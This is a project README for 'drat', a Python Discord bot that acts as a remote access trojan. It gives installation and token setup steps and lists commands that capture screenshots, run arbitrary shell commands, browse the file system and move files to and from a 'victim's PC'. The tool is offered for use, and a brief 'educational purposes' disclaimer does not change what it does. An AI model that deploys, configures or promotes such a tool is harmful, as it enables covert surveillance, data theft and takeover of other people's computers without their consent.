# Discord Bot Tool

![Python version](https://img.shields.io/badge/Python-3.7%2B-blue)
![Discord.py version](https://img.shields.io/badge/discord.py-1.7.0%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)

A versatile Discord bot tool built in Python, designed to provide various functionalities for managing and interacting with a target PC. This tool allows you to capture screenshots, send commands to the victim's PC, navigate the file system, create, download, and upload files. It can be used for educational purposes or in controlled environments where you have proper authorization.

## Features

- Capture screenshots remotely from the victim's PC.
- Execute commands on the victim's PC using Discord commands.
- Navigate the file system on the victim's PC.
- Create new files remotely.
- Download files from the victim's PC.
- Upload files to the victim's PC.

## Installation

1. Clone this repository to your local machine.

```bash
git clone https://github.com/lululepu/drat.git
```

2. Navigate to the project directory.

```bash
cd drat
```

3. Install the required dependencies.

```bash
pip install -r requirements.txt
```

4. Configure the Discord bot token.

- Create a new Discord application and bot in the Discord Developer Portal.
- Invite the bot in your server
- Copy the bot token
- Past it in main.py
- Copy your server id
- Past it in main.py

5. Run the bot.

```bash
py main.py
```

## Usage

Once the bot is up and running, you can use the following commands in Discord to interact with the victim's PC:

- `.ss` : Capture a screenshot of the victim's PC and receive it as an image file.
- `.cmd <command>` : Execute a command on the victim's PC and receive the output.
- `.cd <path>` : Navigate the file system on the victim's PC. Use !navigate / to start from the root directory.
- `.create <directory name>` : Create a new file on the victim's PC.
- `.download <filename>` : Download a file from the victim's PC.
- `.upload <filename>` : Upload a file to the victim's PC.

**Note**: Be cautious when using this tool and ensure that you have proper authorization to access and interact with the victim's PC. This tool is intended for educational purposes or controlled environments only.

## Contributing

Contributions to this project are welcome. If you find any issues or would like to suggest new features, please open an issue or submit a pull request.
